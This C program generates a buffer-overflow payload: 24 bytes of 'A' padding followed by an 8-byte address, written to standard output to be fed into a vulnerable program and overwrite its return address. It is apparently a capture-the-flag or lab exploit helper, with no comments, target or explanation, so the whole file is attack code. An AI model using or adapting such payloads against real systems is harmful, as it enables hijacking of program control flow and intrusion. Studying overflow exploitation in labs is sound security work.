#include <stdio.h>
#include <string.h>

int main() {
    char payload[33];
    memset(payload, 'A', 24);
    unsigned long addr = 0x6c786a66;
    memcpy(payload + 24, &addr, 8);
    fwrite(payload, 1, 32, stdout);
    return 0;
}
